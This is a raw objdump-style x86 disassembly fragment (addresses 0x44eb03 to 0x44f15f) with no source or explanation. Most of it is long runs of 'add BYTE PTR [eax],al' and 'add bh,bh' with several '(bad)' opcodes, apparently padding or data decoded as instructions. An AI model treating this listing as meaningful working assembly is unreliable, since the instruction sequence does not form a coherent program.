  44eb03:	sbb    al,0x12
  44eb05:	cmp    eax,0x740a0bff
  44eb0a:	call   FWORD PTR [esi]
  44eb0c:	sbb    al,0x33
  44eb0e:	call   DWORD PTR [ecx]
  44eb10:	push   ss
  44eb11:	push   ebp
  44eb12:	dec    DWORD PTR [ecx]
  44eb14:	adc    eax,0x1c23fff4
  44eb19:	notrack call DWORD PTR [esp+ebx*1]
  44eb1d:	ja     0x44eb1e
  44eb1f:	adc    bl,BYTE PTR [edi]
  44eb21:	(bad)  
  44eb22:	jmp    DWORD PTR [ebp*1+0x330dffba]
  44eb29:	(bad)  
  44eb2a:	inc    DWORD PTR [eax]
  44eb2c:	add    DWORD PTR [ebx],eax
  44eb2e:	inc    DWORD PTR [eax]
  44eb30:	add    BYTE PTR [eax],al
  44eb32:	inc    DWORD PTR [eax]
  44eb34:	add    BYTE PTR [eax],al
  44eb36:	inc    DWORD PTR [eax]
  44eb38:	add    BYTE PTR [eax],al
  44eb3a:	inc    DWORD PTR [eax]
  44eb3c:	add    ch,BYTE PTR ds:0xbc1305ff
  44eb42:	call   DWORD PTR [esi]
  44eb44:	and    BYTE PTR [edi+edi*8+0x13],dh
  44eb48:	adc    al,0x40
  44eb4a:	inc    DWORD PTR [ebx]
  44eb4c:	add    ecx,DWORD PTR [edx]
  44eb4e:	dec    DWORD PTR [eax]
  44eb50:	adc    BYTE PTR [ecx-0x2ed8da01],dl
  44eb56:	call   DWORD PTR [edx]
  44eb58:	adc    BYTE PTR [ecx-0x1],ch
  44eb5b:	sub    BYTE PTR [eax],ch
  44eb5d:	push   edx
  44eb5e:	jmp    FWORD PTR [edi]
  44eb60:	sub    eax,0x80aff8d
  44eb65:	jmp    FWORD PTR es:[eax]
  44eb68:	xor    DWORD PTR [edx-0x5cd0da01],eax
  44eb6e:	dec    DWORD PTR ds:0xcffff1c
  44eb74:	sbb    eax,0x100ffff
  44eb79:	push   esi
  44eb7a:	inc    DWORD PTR [eax]
  44eb7c:	add    DWORD PTR [edx],eax
  44eb7e:	inc    DWORD PTR [eax]
  44eb80:	add    BYTE PTR [eax],al
  44eb82:	inc    DWORD PTR [eax]
  44eb84:	add    BYTE PTR [eax],al
  44eb86:	inc    DWORD PTR [eax]
  44eb88:	add    BYTE PTR [eax],al
  44eb8a:	inc    DWORD PTR [eax]
  44eb8c:	add    BYTE PTR [eax],al
  44eb8e:	inc    DWORD PTR [eax]
  44eb90:	add    BYTE PTR [eax],al
  44eb92:	inc    DWORD PTR [eax]
  44eb94:	add    BYTE PTR [eax],al
  44eb96:	inc    DWORD PTR [eax]
  44eb98:	add    BYTE PTR [eax],al
  44eb9a:	inc    DWORD PTR [eax]
  44eb9c:	add    BYTE PTR [eax],al
  44eb9e:	inc    DWORD PTR [eax]
  44eba0:	add    BYTE PTR [eax],al
  44eba2:	inc    DWORD PTR [eax]
  44eba4:	add    BYTE PTR [eax],al
  44eba6:	inc    DWORD PTR [eax]
  44eba8:	add    BYTE PTR [eax],al
  44ebaa:	inc    DWORD PTR [eax]
  44ebac:	add    BYTE PTR [eax],al
  44ebae:	inc    DWORD PTR [eax]
  44ebb0:	add    BYTE PTR [eax],al
  44ebb2:	inc    DWORD PTR [eax]
  44ebb4:	add    BYTE PTR [edi+edi*8],al
  44ebb7:	pop    es
  44ebb8:	adc    bh,bh
  44ebba:	inc    DWORD PTR [esi]
  44ebbc:	ud0    edi,edi
  44ebbf:	or     ebx,DWORD PTR [eax]
  44ebc1:	(bad)  
  44ebc2:	dec    DWORD PTR [edx]
  44ebc4:	push   ss
  44ebc5:	(bad)  
  44ebc6:	dec    DWORD PTR [ebx]
  44ebc8:	sbb    bh,bh
  44ebca:	dec    DWORD PTR ds:0x6ffff1b
  44ebd0:	xadd   edi,edi
  44ebd3:	or     ebx,DWORD PTR [esi]
  44ebd5:	(bad)  
  44ebd6:	dec    DWORD PTR [esi]
  44ebd8:	sub    bh,bh
  44ebda:	dec    DWORD PTR [esi]
  44ebdc:	xor    edi,edi
  44ebde:	dec    DWORD PTR [esi]
  44ebe0:	xor    al,0xff
  44ebe2:	dec    DWORD PTR [esi]
  44ebe4:	xor    eax,0x3e0effff
  44ebe9:	(bad)  
  44ebea:	inc    DWORD PTR [eax]
  44ebec:	add    DWORD PTR [ebx],eax
  44ebee:	inc    DWORD PTR [eax]
  44ebf0:	add    BYTE PTR [eax],al
  44ebf2:	inc    DWORD PTR [edi]
  44ebf4:	push   es
  44ebf5:	push   es
  44ebf6:	inc    DWORD PTR [eax]
  44ebf8:	add    BYTE PTR ds:0xff210dff,bh
  44ebfe:	dec    DWORD PTR ds:0xdffff1f
  44ec04:	push   ds
  44ec05:	(bad)  
  44ec06:	dec    DWORD PTR ds:0xbffff1d
  44ec0c:	sbb    al,0xff
  44ec0e:	dec    DWORD PTR ds:0xdffff20
  44ec14:	and    bh,bh
  44ec16:	dec    DWORD PTR ds:0xeffff24
  44ec1c:	and    bh,bh
  44ec1e:	dec    DWORD PTR ds:0xaffff20
  44ec24:	sbb    al,0xff
  44ec26:	dec    DWORD PTR [edx]
  44ec28:	push   ds
  44ec29:	(bad)  
  44ec2a:	dec    DWORD PTR [edx]
  44ec2c:	sbb    edi,edi
  44ec2e:	inc    DWORD PTR [eax]
  44ec30:	add    DWORD PTR [eax-0x1],ebp
  44ec33:	add    BYTE PTR [ecx],al
  44ec35:	add    edi,edi
  44ec37:	add    BYTE PTR [eax],al
  44ec39:	add    bh,bh
  44ec3b:	add    BYTE PTR [eax],al
  44ec3d:	add    bh,bh
  44ec3f:	add    BYTE PTR [eax],al
  44ec41:	add    bh,bh
  44ec43:	add    BYTE PTR [eax],al
  44ec45:	add    bh,bh
  44ec47:	add    BYTE PTR [eax],al
  44ec49:	add    bh,bh
  44ec4b:	add    BYTE PTR [eax],al
  44ec4d:	add    bh,bh
  44ec4f:	add    BYTE PTR [eax],al
  44ec51:	add    bh,bh
  44ec53:	add    BYTE PTR [eax],al
  44ec55:	add    bh,bh
  44ec57:	add    BYTE PTR [eax],al
  44ec59:	add    bh,bh
  44ec5b:	add    BYTE PTR [eax],al
  44ec5d:	add    bh,bh
  44ec5f:	add    BYTE PTR [eax],al
  44ec61:	add    bh,bh
  44ec63:	add    BYTE PTR [eax],al
  44ec65:	add    bh,bh
  44ec67:	add    BYTE PTR [eax],al
  44ec69:	add    bh,bh
  44ec6b:	add    BYTE PTR [eax],al
  44ec6d:	add    bh,bh
  44ec6f:	add    BYTE PTR [eax],al
  44ec71:	add    bh,bh
  44ec73:	add    BYTE PTR [eax],al
  44ec75:	add    bh,bh
  44ec77:	add    BYTE PTR [ecx],al
  44ec79:	add    bh,bh
  44ec7b:	add    BYTE PTR [ecx],al
  44ec7d:	add    bh,bh
  44ec7f:	add    BYTE PTR [ecx],al
  44ec81:	add    edi,edi
  44ec83:	add    BYTE PTR [ecx],al
  44ec85:	add    edi,edi
  44ec87:	add    BYTE PTR [ecx],al
  44ec89:	add    edi,edi
  44ec8b:	add    BYTE PTR [ecx],al
  44ec8d:	add    edi,edi
  44ec8f:	add    BYTE PTR [ecx],al
  44ec91:	add    edi,edi
  44ec93:	add    BYTE PTR [ecx],al
  44ec95:	add    edi,edi
  44ec97:	add    BYTE PTR [ecx],al
  44ec99:	add    edi,edi
  44ec9b:	add    BYTE PTR [ecx],al
  44ec9d:	add    edi,edi
  44ec9f:	add    BYTE PTR [ecx],al
  44eca1:	add    edi,edi
  44eca3:	add    BYTE PTR [ecx],al
  44eca5:	add    edi,edi
  44eca7:	add    BYTE PTR [ecx],al
  44eca9:	add    edi,edi
  44ecab:	add    BYTE PTR [ecx],al
  44ecad:	add    edi,edi
  44ecaf:	add    BYTE PTR [eax],al
  44ecb1:	add    bh,bh
  44ecb3:	add    BYTE PTR [eax],al
  44ecb5:	add    bh,bh
  44ecb7:	add    BYTE PTR [ecx],al
  44ecb9:	add    edi,edi
  44ecbb:	add    BYTE PTR [ecx],al
  44ecbd:	add    edi,edi
  44ecbf:	add    BYTE PTR [ecx],al
  44ecc1:	add    edi,edi
  44ecc3:	add    BYTE PTR [ecx],al
  44ecc5:	add    edi,edi
  44ecc7:	add    BYTE PTR [ecx],al
  44ecc9:	add    edi,edi
  44eccb:	add    BYTE PTR [ecx],al
  44eccd:	add    edi,edi
  44eccf:	add    BYTE PTR [ecx],al
  44ecd1:	add    edi,edi
  44ecd3:	add    BYTE PTR [ecx],al
  44ecd5:	add    edi,edi
  44ecd7:	add    BYTE PTR [ecx],al
  44ecd9:	add    edi,edi
  44ecdb:	add    BYTE PTR [ecx],al
  44ecdd:	add    edi,edi
  44ecdf:	add    BYTE PTR [ecx],al
  44ece1:	add    edi,edi
  44ece3:	add    BYTE PTR [ecx],al
  44ece5:	add    edi,edi
  44ece7:	add    BYTE PTR [ecx],al
  44ece9:	add    edi,edi
  44eceb:	add    BYTE PTR [ecx],al
  44eced:	add    bh,bh
  44ecef:	add    BYTE PTR [eax],al
  44ecf1:	add    bh,bh
  44ecf3:	add    BYTE PTR [eax],al
  44ecf5:	add    bh,bh
  44ecf7:	add    BYTE PTR [eax],al
  44ecf9:	add    bh,bh
  44ecfb:	add    BYTE PTR [eax],al
  44ecfd:	add    bh,bh
  44ecff:	add    BYTE PTR [eax],al
  44ed01:	add    bh,bh
  44ed03:	add    BYTE PTR [eax],al
  44ed05:	add    bh,bh
  44ed07:	add    BYTE PTR [eax],al
  44ed09:	add    bh,bh
  44ed0b:	add    BYTE PTR [eax],al
  44ed0d:	add    bh,bh
  44ed0f:	add    BYTE PTR [eax],al
  44ed11:	add    bh,bh
  44ed13:	add    BYTE PTR [eax],al
  44ed15:	add    bh,bh
  44ed17:	add    BYTE PTR [eax],al
  44ed19:	add    bh,bh
  44ed1b:	add    BYTE PTR [eax],al
  44ed1d:	add    bh,bh
  44ed1f:	add    BYTE PTR [eax],al
  44ed21:	add    bh,bh
  44ed23:	add    BYTE PTR [eax],al
  44ed25:	add    bh,bh
  44ed27:	add    BYTE PTR [eax],al
  44ed29:	add    bh,bh
  44ed2b:	add    BYTE PTR [eax],al
  44ed2d:	add    bh,bh
  44ed2f:	add    BYTE PTR [eax],al
  44ed31:	add    bh,bh
  44ed33:	add    BYTE PTR [eax],al
  44ed35:	add    bh,bh
  44ed37:	add    BYTE PTR [eax],al
  44ed39:	add    bh,bh
  44ed3b:	add    BYTE PTR [eax],al
  44ed3d:	add    bh,bh
  44ed3f:	add    BYTE PTR [eax],al
  44ed41:	add    bh,bh
  44ed43:	add    BYTE PTR [eax],al
  44ed45:	add    bh,bh
  44ed47:	add    BYTE PTR [eax],al
  44ed49:	add    bh,bh
  44ed4b:	add    BYTE PTR [eax],al
  44ed4d:	add    bh,bh
  44ed4f:	add    BYTE PTR [eax],al
  44ed51:	add    bh,bh
  44ed53:	add    BYTE PTR [eax],al
  44ed55:	add    bh,bh
  44ed57:	add    BYTE PTR [eax],al
  44ed59:	add    bh,bh
  44ed5b:	add    BYTE PTR [eax],al
  44ed5d:	add    bh,bh
  44ed5f:	add    BYTE PTR [eax],al
  44ed61:	add    bh,bh
  44ed63:	add    BYTE PTR [eax],al
  44ed65:	add    bh,bh
  44ed67:	add    BYTE PTR [eax],al
  44ed69:	add    bh,bh
  44ed6b:	add    BYTE PTR [eax],al
  44ed6d:	add    bh,bh
  44ed6f:	add    BYTE PTR [eax],al
  44ed71:	add    bh,bh
  44ed73:	add    BYTE PTR [eax],al
  44ed75:	add    bh,bh
  44ed77:	add    BYTE PTR [eax],al
  44ed79:	add    bh,bh
  44ed7b:	add    BYTE PTR [eax],al
  44ed7d:	add    bh,bh
  44ed7f:	add    BYTE PTR [eax],al
  44ed81:	add    bh,bh
  44ed83:	add    BYTE PTR [eax],al
  44ed85:	add    bh,bh
  44ed87:	add    BYTE PTR [eax],al
  44ed89:	add    bh,bh
  44ed8b:	add    BYTE PTR [eax],al
  44ed8d:	add    bh,bh
  44ed8f:	add    BYTE PTR [eax],al
  44ed91:	add    bh,bh
  44ed93:	add    BYTE PTR [eax],al
  44ed95:	add    bh,bh
  44ed97:	add    BYTE PTR [eax],al
  44ed99:	add    bh,bh
  44ed9b:	add    BYTE PTR [eax],al
  44ed9d:	add    bh,bh
  44ed9f:	add    BYTE PTR [eax],al
  44eda1:	add    bh,bh
  44eda3:	add    BYTE PTR [eax],al
  44eda5:	add    bh,bh
  44eda7:	add    BYTE PTR [eax],al
  44eda9:	add    bh,bh
  44edab:	add    BYTE PTR [eax],al
  44edad:	add    bh,bh
  44edaf:	add    BYTE PTR [eax],al
  44edb1:	add    bh,bh
  44edb3:	add    BYTE PTR [eax],al
  44edb5:	add    bh,bh
  44edb7:	add    BYTE PTR [eax],al
  44edb9:	add    bh,bh
  44edbb:	add    BYTE PTR [eax],al
  44edbd:	add    bh,bh
  44edbf:	add    BYTE PTR [eax],al
  44edc1:	add    bh,bh
  44edc3:	add    BYTE PTR [eax],al
  44edc5:	add    bh,bh
  44edc7:	add    BYTE PTR [eax],al
  44edc9:	add    bh,bh
  44edcb:	add    BYTE PTR [eax],al
  44edcd:	add    bh,bh
  44edcf:	add    BYTE PTR [eax],al
  44edd1:	add    bh,bh
  44edd3:	add    BYTE PTR [eax],al
  44edd5:	add    bh,bh
  44edd7:	add    BYTE PTR [eax],al
  44edd9:	add    bh,bh
  44eddb:	add    BYTE PTR [eax],al
  44eddd:	add    bh,bh
  44eddf:	add    BYTE PTR [eax],al
  44ede1:	add    bh,bh
  44ede3:	add    BYTE PTR [eax],al
  44ede5:	add    bh,bh
  44ede7:	add    BYTE PTR [eax],al
  44ede9:	add    bh,bh
  44edeb:	add    BYTE PTR [eax],al
  44eded:	add    bh,bh
  44edef:	add    BYTE PTR [eax],al
  44edf1:	add    bh,bh
  44edf3:	add    BYTE PTR [eax],al
  44edf5:	add    bh,bh
  44edf7:	add    BYTE PTR [eax],al
  44edf9:	add    bh,bh
  44edfb:	add    BYTE PTR [eax],al
  44edfd:	add    bh,bh
  44edff:	add    BYTE PTR [eax],al
  44ee01:	add    bh,bh
  44ee03:	add    BYTE PTR [eax],al
  44ee05:	add    bh,bh
  44ee07:	add    BYTE PTR [eax],al
  44ee09:	add    bh,bh
  44ee0b:	add    BYTE PTR [eax],al
  44ee0d:	add    bh,bh
  44ee0f:	add    BYTE PTR [eax],al
  44ee11:	add    bh,bh
  44ee13:	add    BYTE PTR [eax],al
  44ee15:	add    bh,bh
  44ee17:	add    BYTE PTR [eax],al
  44ee19:	add    bh,bh
  44ee1b:	add    BYTE PTR [eax],al
  44ee1d:	add    bh,bh
  44ee1f:	add    BYTE PTR [eax],al
  44ee21:	add    bh,bh
  44ee23:	add    BYTE PTR [eax],al
  44ee25:	add    bh,bh
  44ee27:	add    BYTE PTR [eax],al
  44ee29:	add    bh,bh
  44ee2b:	add    BYTE PTR [eax],al
  44ee2d:	add    bh,bh
  44ee2f:	add    BYTE PTR [eax],al
  44ee31:	add    bh,bh
  44ee33:	add    BYTE PTR [eax],al
  44ee35:	add    bh,bh
  44ee37:	add    BYTE PTR [eax],al
  44ee39:	add    bh,bh
  44ee3b:	add    BYTE PTR [eax],al
  44ee3d:	add    bh,bh
  44ee3f:	add    BYTE PTR [eax],al
  44ee41:	add    bh,bh
  44ee43:	add    BYTE PTR [eax],al
  44ee45:	add    bh,bh
  44ee47:	add    BYTE PTR [eax],al
  44ee49:	add    bh,bh
  44ee4b:	add    BYTE PTR [eax],al
  44ee4d:	add    bh,bh
  44ee4f:	add    BYTE PTR [eax],al
  44ee51:	add    bh,bh
  44ee53:	add    BYTE PTR [eax],al
  44ee55:	add    bh,bh
  44ee57:	add    BYTE PTR [eax],al
  44ee59:	add    bh,bh
  44ee5b:	add    BYTE PTR [eax],al
  44ee5d:	add    bh,bh
  44ee5f:	add    BYTE PTR [eax],al
  44ee61:	add    bh,bh
  44ee63:	add    BYTE PTR [eax],al
  44ee65:	add    bh,bh
  44ee67:	add    BYTE PTR [eax],al
  44ee69:	add    bh,bh
  44ee6b:	add    BYTE PTR [eax],al
  44ee6d:	add    bh,bh
  44ee6f:	add    BYTE PTR [eax],al
  44ee71:	add    bh,bh
  44ee73:	add    BYTE PTR [eax],al
  44ee75:	add    bh,bh
  44ee77:	add    BYTE PTR [eax],al
  44ee79:	add    bh,bh
  44ee7b:	add    BYTE PTR [eax],al
  44ee7d:	add    bh,bh
  44ee7f:	add    BYTE PTR [eax],al
  44ee81:	add    bh,bh
  44ee83:	add    BYTE PTR [eax],al
  44ee85:	add    bh,bh
  44ee87:	add    BYTE PTR [eax],al
  44ee89:	add    bh,bh
  44ee8b:	add    BYTE PTR [eax],al
  44ee8d:	add    bh,bh
  44ee8f:	add    BYTE PTR [eax],al
  44ee91:	add    bh,bh
  44ee93:	add    BYTE PTR [eax],al
  44ee95:	add    bh,bh
  44ee97:	add    BYTE PTR [eax],al
  44ee99:	add    bh,bh
  44ee9b:	add    BYTE PTR [eax],al
  44ee9d:	add    bh,bh
  44ee9f:	add    BYTE PTR [eax],al
  44eea1:	add    bh,bh
  44eea3:	add    BYTE PTR [eax],al
  44eea5:	add    bh,bh
  44eea7:	add    BYTE PTR [eax],al
  44eea9:	add    bh,bh
  44eeab:	add    BYTE PTR [eax],al
  44eead:	add    bh,bh
  44eeaf:	add    BYTE PTR [eax],al
  44eeb1:	add    bh,bh
  44eeb3:	add    BYTE PTR [eax],al
  44eeb5:	add    bh,bh
  44eeb7:	add    BYTE PTR [eax],al
  44eeb9:	add    bh,bh
  44eebb:	add    BYTE PTR [eax],al
  44eebd:	add    bh,bh
  44eebf:	add    BYTE PTR [eax],al
  44eec1:	add    bh,bh
  44eec3:	add    BYTE PTR [eax],al
  44eec5:	add    bh,bh
  44eec7:	add    BYTE PTR [eax],al
  44eec9:	add    bh,bh
  44eecb:	add    BYTE PTR [eax],al
  44eecd:	add    bh,bh
  44eecf:	add    BYTE PTR [eax],al
  44eed1:	add    bh,bh
  44eed3:	add    BYTE PTR [eax],al
  44eed5:	add    bh,bh
  44eed7:	add    BYTE PTR [eax],al
  44eed9:	add    bh,bh
  44eedb:	add    BYTE PTR [eax],al
  44eedd:	add    bh,bh
  44eedf:	add    BYTE PTR [eax],al
  44eee1:	add    bh,bh
  44eee3:	add    BYTE PTR [eax],al
  44eee5:	add    bh,bh
  44eee7:	add    BYTE PTR [eax],al
  44eee9:	add    bh,bh
  44eeeb:	add    BYTE PTR [eax],al
  44eeed:	add    bh,bh
  44eeef:	add    BYTE PTR [eax],al
  44eef1:	add    bh,bh
  44eef3:	add    BYTE PTR [eax],al
  44eef5:	add    bh,bh
  44eef7:	add    BYTE PTR [eax],al
  44eef9:	add    bh,bh
  44eefb:	add    BYTE PTR [eax],al
  44eefd:	add    bh,bh
  44eeff:	add    BYTE PTR [eax],al
  44ef01:	add    bh,bh
  44ef03:	add    BYTE PTR [eax],al
  44ef05:	add    bh,bh
  44ef07:	add    BYTE PTR [eax],al
  44ef09:	add    bh,bh
  44ef0b:	add    BYTE PTR [eax],al
  44ef0d:	add    bh,bh
  44ef0f:	add    BYTE PTR [eax],al
  44ef11:	add    bh,bh
  44ef13:	add    BYTE PTR [eax],al
  44ef15:	add    bh,bh
  44ef17:	add    BYTE PTR [eax],al
  44ef19:	add    bh,bh
  44ef1b:	add    BYTE PTR [eax],al
  44ef1d:	add    bh,bh
  44ef1f:	add    BYTE PTR [eax],al
  44ef21:	add    bh,bh
  44ef23:	add    BYTE PTR [eax],al
  44ef25:	add    bh,bh
  44ef27:	add    BYTE PTR [eax],al
  44ef29:	add    bh,bh
  44ef2b:	add    BYTE PTR [eax],al
  44ef2d:	add    bh,bh
  44ef2f:	add    BYTE PTR [eax],al
  44ef31:	add    bh,bh
  44ef33:	add    BYTE PTR [eax],al
  44ef35:	add    bh,bh
  44ef37:	add    BYTE PTR [eax],al
  44ef39:	add    bh,bh
  44ef3b:	add    BYTE PTR [eax],al
  44ef3d:	add    bh,bh
  44ef3f:	add    BYTE PTR [eax],al
  44ef41:	add    bh,bh
  44ef43:	add    BYTE PTR [eax],al
  44ef45:	add    bh,bh
  44ef47:	add    BYTE PTR [eax],al
  44ef49:	add    bh,bh
  44ef4b:	add    BYTE PTR [eax],al
  44ef4d:	add    bh,bh
  44ef4f:	add    BYTE PTR [eax],al
  44ef51:	add    bh,bh
  44ef53:	add    BYTE PTR [eax],al
  44ef55:	add    bh,bh
  44ef57:	add    al,0x3
  44ef59:	add    edi,ebp
  44ef5b:	add    BYTE PTR [eax],al
  44ef5d:	add    bh,bh
  44ef5f:	add    BYTE PTR [eax],al
  44ef61:	add    bh,bh
  44ef63:	add    BYTE PTR [eax],al
  44ef65:	add    bh,bh
  44ef67:	add    BYTE PTR [eax],al
  44ef69:	add    bh,bh
  44ef6b:	add    BYTE PTR [eax],al
  44ef6d:	add    bh,bh
  44ef6f:	add    BYTE PTR [eax],al
  44ef71:	add    bh,bh
  44ef73:	add    BYTE PTR [eax],al
  44ef75:	add    bh,bh
  44ef77:	add    BYTE PTR [eax],al
  44ef79:	add    bh,bh
  44ef7b:	add    BYTE PTR [eax],al
  44ef7d:	add    bh,bh
  44ef7f:	add    BYTE PTR [eax],al
  44ef81:	add    bh,bh
  44ef83:	add    BYTE PTR [eax],al
  44ef85:	add    bh,bh
  44ef87:	add    BYTE PTR [eax],al
  44ef89:	add    bh,bh
  44ef8b:	add    BYTE PTR [eax],al
  44ef8d:	add    bh,bh
  44ef8f:	add    BYTE PTR [eax],al
  44ef91:	add    bh,bh
  44ef93:	add    BYTE PTR [eax],al
  44ef95:	add    bh,bh
  44ef97:	add    BYTE PTR [eax],al
  44ef99:	add    bh,bh
  44ef9b:	add    BYTE PTR [eax],al
  44ef9d:	add    bh,bh
  44ef9f:	add    BYTE PTR [eax],al
  44efa1:	add    bh,bh
  44efa3:	add    BYTE PTR [eax],al
  44efa5:	add    bh,bh
  44efa7:	add    BYTE PTR [eax],al
  44efa9:	add    bh,bh
  44efab:	add    BYTE PTR [eax],al
  44efad:	add    bh,bh
  44efaf:	add    BYTE PTR [eax],al
  44efb1:	add    bh,bh
  44efb3:	add    BYTE PTR [eax],al
  44efb5:	add    bh,bh
  44efb7:	add    BYTE PTR [eax],al
  44efb9:	add    bh,bh
  44efbb:	add    BYTE PTR [eax],al
  44efbd:	add    bh,bh
  44efbf:	add    BYTE PTR [eax],al
  44efc1:	add    bh,bh
  44efc3:	add    BYTE PTR [eax],al
  44efc5:	add    bh,bh
  44efc7:	add    BYTE PTR [eax],al
  44efc9:	add    bh,bh
  44efcb:	add    BYTE PTR [eax],al
  44efcd:	add    bh,bh
  44efcf:	add    BYTE PTR [eax],al
  44efd1:	add    bh,bh
  44efd3:	add    BYTE PTR [eax],al
  44efd5:	add    bh,bh
  44efd7:	add    BYTE PTR [eax],al
  44efd9:	add    bh,bh
  44efdb:	add    BYTE PTR [eax],al
  44efdd:	add    bh,bh
  44efdf:	add    BYTE PTR [eax],al
  44efe1:	add    bh,bh
  44efe3:	add    BYTE PTR [eax],al
  44efe5:	add    bh,bh
  44efe7:	add    BYTE PTR [eax],al
  44efe9:	add    bh,bh
  44efeb:	add    BYTE PTR [eax],al
  44efed:	add    bh,bh
  44efef:	add    BYTE PTR [eax],al
  44eff1:	add    bh,bh
  44eff3:	add    BYTE PTR [eax],al
  44eff5:	add    bh,bh
  44eff7:	add    BYTE PTR [eax],al
  44eff9:	add    bh,bh
  44effb:	add    BYTE PTR [eax],al
  44effd:	add    bh,bh
  44efff:	add    BYTE PTR [eax],al
  44f001:	add    bh,bh
  44f003:	add    BYTE PTR [eax],al
  44f005:	add    bh,bh
  44f007:	add    BYTE PTR [eax],al
  44f009:	add    bh,bh
  44f00b:	add    BYTE PTR [eax],al
  44f00d:	add    bh,bh
  44f00f:	add    BYTE PTR [eax],al
  44f011:	add    bh,bh
  44f013:	add    al,0x4
  44f015:	add    al,0xfc
  44f017:	add    BYTE PTR [eax],al
  44f019:	add    BYTE PTR [eax-0x1000000],bh
  44f01f:	add    BYTE PTR [eax],al
  44f021:	add    bh,bh
  44f023:	add    BYTE PTR [eax],al
  44f025:	add    bh,bh
  44f027:	add    BYTE PTR [eax],al
  44f029:	add    bh,bh
  44f02b:	add    BYTE PTR [eax],al
  44f02d:	add    bh,bh
  44f02f:	add    BYTE PTR [eax],al
  44f031:	add    bh,bh
  44f033:	add    BYTE PTR [eax],al
  44f035:	add    bh,bh
  44f037:	add    BYTE PTR [eax],al
  44f039:	add    bh,bh
  44f03b:	add    BYTE PTR [eax],al
  44f03d:	add    bh,bh
  44f03f:	add    BYTE PTR [eax],al
  44f041:	add    bh,bh
  44f043:	add    BYTE PTR [eax],al
  44f045:	add    bh,bh
  44f047:	add    BYTE PTR [eax],al
  44f049:	add    bh,bh
  44f04b:	add    BYTE PTR [eax],al
  44f04d:	add    bh,bh
  44f04f:	add    BYTE PTR [eax],al
  44f051:	add    bh,bh
  44f053:	add    BYTE PTR [eax],al
  44f055:	add    bh,bh
  44f057:	add    BYTE PTR [eax],al
  44f059:	add    bh,bh
  44f05b:	add    BYTE PTR [eax],al
  44f05d:	add    bh,bh
  44f05f:	add    BYTE PTR [eax],al
  44f061:	add    bh,bh
  44f063:	add    BYTE PTR [eax],al
  44f065:	add    bh,bh
  44f067:	add    BYTE PTR [eax],al
  44f069:	add    bh,bh
  44f06b:	add    BYTE PTR [eax],al
  44f06d:	add    bh,bh
  44f06f:	add    BYTE PTR [eax],al
  44f071:	add    bh,bh
  44f073:	add    BYTE PTR [eax],al
  44f075:	add    bh,bh
  44f077:	add    BYTE PTR [eax],al
  44f079:	add    bh,bh
  44f07b:	add    BYTE PTR [eax],al
  44f07d:	add    bh,bh
  44f07f:	add    BYTE PTR [eax],al
  44f081:	add    bh,bh
  44f083:	add    BYTE PTR [eax],al
  44f085:	add    bh,bh
  44f087:	add    BYTE PTR [eax],al
  44f089:	add    bh,bh
  44f08b:	add    BYTE PTR [eax],al
  44f08d:	add    bh,bh
  44f08f:	add    BYTE PTR [eax],al
  44f091:	add    bh,bh
  44f093:	add    BYTE PTR [eax],al
  44f095:	add    bh,bh
  44f097:	add    BYTE PTR [eax],al
  44f099:	add    bh,bh
  44f09b:	add    BYTE PTR [eax],al
  44f09d:	add    bh,bh
  44f09f:	add    BYTE PTR [eax],al
  44f0a1:	add    bh,bh
  44f0a3:	add    BYTE PTR [eax],al
  44f0a5:	add    bh,bh
  44f0a7:	add    BYTE PTR [eax],al
  44f0a9:	add    bh,bh
  44f0ab:	add    BYTE PTR [eax],al
  44f0ad:	add    bh,bh
  44f0af:	add    BYTE PTR [eax],al
  44f0b1:	add    bh,bh
  44f0b3:	add    BYTE PTR [eax],al
  44f0b5:	add    bh,bh
  44f0b7:	add    BYTE PTR [eax],al
  44f0b9:	add    bh,bh
  44f0bb:	add    BYTE PTR [eax],al
  44f0bd:	add    bh,bh
  44f0bf:	add    BYTE PTR [eax],al
  44f0c1:	add    bh,bh
  44f0c3:	add    BYTE PTR [eax],al
  44f0c5:	add    bh,bh
  44f0c7:	add    BYTE PTR [eax],al
  44f0c9:	add    bh,bh
  44f0cb:	add    BYTE PTR [eax],al
  44f0cd:	add    bh,bh
  44f0cf:	add    BYTE PTR [eax],al
  44f0d1:	add    bh,bh
  44f0d3:	add    BYTE PTR [eax],al
  44f0d5:	add    BYTE PTR [esi+0x27000000],ah
  44f0db:	add    BYTE PTR [eax],al
  44f0dd:	add    BYTE PTR [edi-0x1fdfdfd],dh
  44f0e3:	add    BYTE PTR [eax],al
  44f0e5:	add    bh,bh
  44f0e7:	add    BYTE PTR [eax],al
  44f0e9:	add    bh,bh
  44f0eb:	add    BYTE PTR [eax],al
  44f0ed:	add    bh,bh
  44f0ef:	add    BYTE PTR [eax],al
  44f0f1:	add    bh,bh
  44f0f3:	add    BYTE PTR [eax],al
  44f0f5:	add    bh,bh
  44f0f7:	add    BYTE PTR [eax],al
  44f0f9:	add    bh,bh
  44f0fb:	add    BYTE PTR [eax],al
  44f0fd:	add    bh,bh
  44f0ff:	add    BYTE PTR [eax],al
  44f101:	add    bh,bh
  44f103:	add    BYTE PTR [eax],al
  44f105:	add    bh,bh
  44f107:	add    BYTE PTR [eax],al
  44f109:	add    bh,bh
  44f10b:	add    BYTE PTR [eax],al
  44f10d:	add    bh,bh
  44f10f:	add    BYTE PTR [eax],al
  44f111:	add    bh,bh
  44f113:	add    BYTE PTR [eax],al
  44f115:	add    bh,bh
  44f117:	add    BYTE PTR [eax],al
  44f119:	add    bh,bh
  44f11b:	add    BYTE PTR [eax],al
  44f11d:	add    bh,bh
  44f11f:	add    BYTE PTR [eax],al
  44f121:	add    bh,bh
  44f123:	add    BYTE PTR [eax],al
  44f125:	add    bh,bh
  44f127:	add    BYTE PTR [eax],al
  44f129:	add    bh,bh
  44f12b:	add    BYTE PTR [eax],al
  44f12d:	add    bh,bh
  44f12f:	add    BYTE PTR [eax],al
  44f131:	add    bh,bh
  44f133:	add    BYTE PTR [eax],al
  44f135:	add    bh,bh
  44f137:	add    BYTE PTR [eax],al
  44f139:	add    bh,bh
  44f13b:	add    BYTE PTR [eax],al
  44f13d:	add    bh,bh
  44f13f:	add    BYTE PTR [eax],al
  44f141:	add    bh,bh
  44f143:	add    BYTE PTR [eax],al
  44f145:	add    bh,bh
  44f147:	add    BYTE PTR [eax],al
  44f149:	add    bh,bh
  44f14b:	add    BYTE PTR [eax],al
  44f14d:	add    bh,bh
  44f14f:	add    BYTE PTR [eax],al
  44f151:	add    bh,bh
  44f153:	add    BYTE PTR [eax],al
  44f155:	add    bh,bh
  44f157:	add    BYTE PTR [eax],al
  44f159:	add    bh,bh
  44f15b:	add    BYTE PTR [eax],al
  44f15d:	add    bh,bh
  44f15f:	add    BYTE PTR [eax],al
